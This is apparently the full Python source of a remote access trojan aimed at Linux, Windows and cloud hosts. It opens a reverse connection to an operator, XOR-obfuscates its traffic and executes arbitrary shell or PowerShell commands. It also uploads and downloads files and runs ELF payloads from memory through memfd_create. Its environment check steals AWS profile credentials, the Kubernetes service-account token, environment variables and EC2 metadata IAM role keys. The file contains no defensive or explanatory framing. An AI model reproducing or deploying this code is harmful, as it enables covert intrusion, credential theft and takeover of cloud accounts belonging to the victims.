import os
import socket, boto3
import sys
import base64
import platform
import requests
import psutil
import json
from multiprocessing import Process
import time, random, string
from subprocess import PIPE, Popen








global stop_thread

letters = string.ascii_lowercase

MEM_INJ_KEY = ''.join(random.choice(letters) for i in range(20))

particles = {}

def str_xor(a, key):
    cipherAscii = ""
    keyLength = len(key)
    for i in range(0, len(a)):
        j = i % keyLength
        xor = ord(a[i]) ^ ord(key[j])
        cipherAscii = cipherAscii + chr(xor)
    return cipherAscii

def execAnonFile(args,wait_for_proc_terminate, c):
    s = ""
    for _ in range(7):
        s += random.choice(string.ascii_lowercase)

    fd = os.memfd_create(s,0)
    if fd == -1:
        return ("Error in creating fd")
    else:
        with open("/proc/self/fd/{}".format(fd),'wb') as f:
            f.write(c)

        child_pid = os.fork()
        if child_pid == -1:
            return ("Error executing the code")
        elif child_pid == 0:
            fname = "/proc/self/fd/{}".format(fd)
            args.insert(0,fname)
            os.execve(fname,args,dict(os.environ))
        else:
            if wait_for_proc_terminate:
                os.waitpid(child_pid,0)

def init_info(system):
    if system == 'Linux':
        check_env = {}
        check_env["SYSTEM"] = system

        user = os.environ.get('USER')
        check_env['USER'] = user

        uname = os.uname()
        un = {}
        un['sysname'] = uname.sysname
        un['nodename'] = uname.nodename
        un['release'] = uname.release
        un['version'] = uname.version
        un['arch'] = uname.machine

        uname = json.dumps(un)
        check_env['UNAME'] = uname

        env = os.environ
        env_dict = {}
        for key, value in env.items():
            env_dict[key] = value
        check_env["ENV"] = env_dict

        proc = psutil.Process(1).name()
        check_env['INIT'] = proc

        if os.path.exists('/var/run/docker.sock'):
            docksock = True
        else:
            docksock = False

        check_env['DOCKSOCK'] = docksock

        try:
            fdisk = os.popen('fdisk -l').read()
            if not fdisk == "":
                if "Permission denied" in fdisk:
                    privileged = False
                else:
                    privileged = True
                    disks = []
                    alldisks = fdisk.split(" ")

                    for d in alldisks:
                        if "/dev/" in d:
                            index = alldisks.index(d)
                            d = d + " " + alldisks[index+1] + " " + alldisks[index+2]
                            if not d in disks:
                                disks.append(d.replace(":", ""))

                    check_env['DISKS'] = disks
            else:
                privileged = False
        except:
            pass

        check_env['PRIVILEGED'] = privileged

        if os.path.exists('/run/secrets/kubernetes.io/serviceaccount/token'):
            kubetoken = open('/run/secrets/kubernetes.io/serviceaccount/token', 'r').read()
            kubetoken.close()
            check_env['KUBETOKEN'] = kubetoken

        hostname = platform.node()
        check_env['HOSTNAME'] = hostname

        all_sessions = []
        sessions = boto3.session.Session()
        available_sessions = sessions.available_profiles
        if len(available_sessions) > 0:
            for prof_name in available_sessions:
                sess = boto3.session.Session(profile_name=prof_name)
                credentials = sess.get_credentials().get_frozen_credentials()
                awssess = {}
                awssess['profile'] = prof_name
                awssess['AWS_KEY'] = credentials.access_key
                awssess['SECRET_KEY'] = credentials.secret_key
                awssess['region'] = sess.region_name
                if not credentials.token == None:
                    awssess['session_token'] = credentials.token
                del credentials
                all_sessions.append(awssess)

        check_env['AWS_CREDS'] = all_sessions
        return check_env

def meta_data():
    metadata = {}
    metatest = {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest = {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest = {
        "macs": "/network/interfaces/macs",
        "interfaces": []
    }

    interfaces = {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-ids": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    metalink = "http://169.254.169.254/latest/"

    try:
        r = requests.get(metalink, timeout=5)

        if r.status_code == 200:
            metadata["status_code"] = r.status_code
            for key,value in metatest.items():
                meta_resp = requests.get("{}{}".format(metalink,value))
                metadata[key] = meta_resp.text

            iam_req = requests.get("{}{}".format(metalink, iam_metatest['iam-info']))
            if iam_req.status_code == 200:
                iam_info = iam_req.json()
                iam_arn = iam_info['InstanceProfileArn']
                ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role'])).text
                iam_keys = requests.get("{}{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role)).json()
                iam_keys['InstanceProfileArn'] = iam_arn

            else:
                iam_keys = {}

            metadata['iam'] = iam_keys

            '''
            ifs = {}
            metalink = metalink + "meta-data"
            macs = requests.get("{}{}".format(metalink, adv_metatest['macs'])).json()
            for mac in macs:
                for key, value in interfaces.items():
                    meta_resp = requests.get("{}{}{}".format(metalink, mac, value))
                    ifs[mac] = meta_resp.text

            metadata['interfaces'] = ifs
            '''

        elif r.status_code == 401:
            try:
                headers = {"X-aws-ec2-metadata-token-ttl-seconds": '21600'}
                test_token = requests.put("http://169.254.169.254/latest/api/token", headers=headers, timeout=5)
                TOKEN = test_token.text
                # TOKEN= `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
                # && curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
                metadata["status_code"] = 200
                headers = {"X-aws-ec2-metadata-token": TOKEN}
                metadata["status_code"] = test_token.status_code
                for key, value in metatest.items():
                    meta_resp = requests.get("{}{}".format(metalink, value), headers=headers, timeout=5)
                    # meta_resp = requests.get("http://169.254.169.254/latest/meta-data/mac", headers=headers, timeout=5)
                    if meta_resp.status_code == 200:
                        metadata[key] = meta_resp.text
                    else:
                        metadata[key] = None
                iam_in = requests.get("{}{}".format(metalink, iam_metatest['iam-info']), headers=headers, timeout=5)
                if iam_in.status_code == 200:
                    iam_info = json.loads(iam_in.text)
                    iam_arn = iam_info['InstanceProfileArn']
                    ec2_role = requests.get("{}{}".format(metalink, iam_metatest['ec2-role']), headers=headers,
                                            timeout=5).text
                    iam_k = requests.get("{}{}{}".format(metalink, iam_metatest['ec2-role'], ec2_role),
                                         headers=headers, timeout=5).text
                    iam_keys = json.loads(iam_k)
                    iam_keys['InstanceProfileArn'] = iam_arn
                    metadata['iam'] = iam_keys

                else:
                    metadata['iam'] = None
                ifs = {}
                metalink = metalink + "meta-data"
                themacs = requests.get("{}{}".format(metalink, adv_metatest['macs']), headers=headers, timeout=5)

                '''
                if themacs.status_code == 200:
                    macs = json.loads(themacs.text)
                    for mac in macs:
                        for key, value in interfaces.items():
                            meta_resp = requests.get("{}{}{}".format(metalink, mac, value), headers=headers, timeout=5)
                            ifs[mac] = meta_resp.text
                    metadata['interfaces'] = ifs
                
                else:
                    metadata['interfaces'] = None
                '''
            except requests.exceptions.ConnectTimeout:
                metadata['status_code'] = 404

        else:
            metadata["status_code"] = r.status_code
    except requests.exceptions.ConnectTimeout:
        metadata['status_code'] = 404

    return metadata

def download(s, filepath, key):
    file = open(filepath, 'rb')
    filebytes = file.read()
    filebytes_64 = base64.b32encode(filebytes)
    filebytes_xor = str_xor(filebytes_64.decode(), key)

    s.send("{}done".format(filebytes_xor).encode())
    file.close()

def upload(filepath, b64):
    file = open(filepath, 'wb')
    filebytes = base64.b32decode(b64)
    file.write(filebytes)
    file.close()

def recvall(s):
    data = b''
    bufferlength = 1048576
    while True:
        a = s.recv(bufferlength)
        if a.decode().strip()[-4:] == 'done':
            data += a
            return data[:-4]
        else:
            data += a


def socket_create():
    global stop_thread

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    system = platform.system()

    if system == 'Linux' or system == 'Darwin':
        user = "{}".format(os.environ.get('USER'))
        if user == None:
            user = os.popen('whoami').read().replace("\n", "")

    elif system == 'Windows':
        user = "{}\\{}".format(os.environ.get('USERDOMAIN'), os.environ.get('USERNAME'))
        if user == None:
            user = os.popen('whoami').read().replace("\n", "")

    ip = ''
    ips = []
    ipss = []
    if system == 'Linux':
        hostname = os.environ.get('NAME')
        ip = os.popen('ip a').read()
        for x in ip.split("\n"):
            if "inet" in x:
                if "127.0.0.1" in x or "::1" in x:
                    continue
                else:
                    ips.append(x.split(" ")[5])
                    ips = ip.split("\n")
                    for x in ips:
                        if "IPv4 Address" in x:
                            a = ips.index(x)
                            ipss.append(x.split(":")[1] + "\t" + (ips[a + 1]).split(":")[1])

    elif system == 'Windows':
        hostname = os.environ.get('COMPUTERNAME')
        ip = os.popen('ipconfig').read()

    info = {}
    info['USER'] = user
    info['SYSTEM'] = system
    info['HOSTNAME'] = hostname
    info['LAN_IP'] = ipss

    dt = json.dumps(info)

    senddt = str_xor(dt, ENCKEY)
    senddt += 'done'
    s.send(senddt.encode())

    while True:
        thedata = recvall(s)
        data = str_xor(thedata.decode(), ENCKEY).strip()

        if data == 'quit' or data == 'exit':
            stop_thread = False
            senddt = str_xor('Ok', ENCKEY)
            senddt += 'done'
            s.send(senddt.encode())
            s.close()
            sys.exit()

        elif len(data) == 0 or data == ' ' or data == '':
            senddt = str_xor(" ", ENCKEY)
            senddt += 'done'
            s.send(senddt.encode())

        elif data.split(" ")[0] == 'run_in_memory':
            file_buffer = b''
            while True:
                b64data = s.recv(65534)
                if b64data:
                    file_buffer += b64data
                else:
                    break
            elf_contents = base64.b32decode(b64data)
            args = []
            wait_for_proc_terminate = True

            try:
                execAnonFile(args, wait_for_proc_terminate, elf_contents)
                senddt = str_xor("done", ENCKEY)
                senddt += 'done'
                s.send(senddt.encode())

            except:
                e = sys.exc_info()[1]
                e += 'done'
                s.send(str_xor(e, ENCKEY).encode())

        elif data.split(" ")[0] == 'download':
            data_json = json.loads(data.strip('download '))
            filepath = data_json['filepath']

            download(s, filepath, ENCKEY)

        elif data.split(" ")[0] == 'upload':
            data_json = json.loads(data.strip('upload '))
            filepath = data_json['filepath']
            b64 = (data_json['filedata']).encode()
            upload(filepath, b64)

        elif data == 'check_env':
            check_env_data = init_info(system)
            metadata = meta_data()
            check_env_data['META-DATA'] = metadata
            check_env_data_str = json.dumps(check_env_data)
            senddt = str_xor(check_env_data_str, ENCKEY)
            senddt += 'done'
            s.send(senddt.encode())

        elif 'cd ' in data:
            os.chdir((data)[1:])

        elif data.split(" ")[0] == 'kill':
            if len(data.split(" ")) == 1:
                senddt = str_xor('kill_errordone', ENCKEY)
                senddt += 'done'
                s.send(senddt.encode())

            else:
                Popen("kill " + data.split(" ")[1], shell=True, stdout=PIPE, stderr=PIPE)
                senddt = str_xor("killed_{}done".format(data.split(" ")[1]), ENCKEY).encode()
                senddt += 'done'
                s.send(senddt.encode())

        else:
            out = err = ""
            if system == 'Windows':
                command = "powershell.exe " + data
                p = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                out, err = p.communicate()
            elif system == 'Linux' or system == 'Darwin':
                p = Popen(data, shell=True, stdout=PIPE, stderr=PIPE)
                out, err = p.communicate()

            if out.decode() == '':
                cout = err.decode()
            else:
                cout = out.decode()

            senddt = str_xor(cout, ENCKEY)
            senddt += 'done'
            s.send(senddt.encode())


def threads():
    global stop_thread
    stop_thread = True
    th = []
    while True:
        thread = Process(target=socket_create)
        th.append(thread)
        thread.start()
        if not stop_thread:
            break
        time.sleep(SECONDS)

    for thread in th:
        thread.terminate()
        thread.join()

if isinstance(SECONDS, int):
    try:
        threads()
    except socket.error:
        threads()
else:
    try:
        socket_create()
    except socket.error:
        exit()
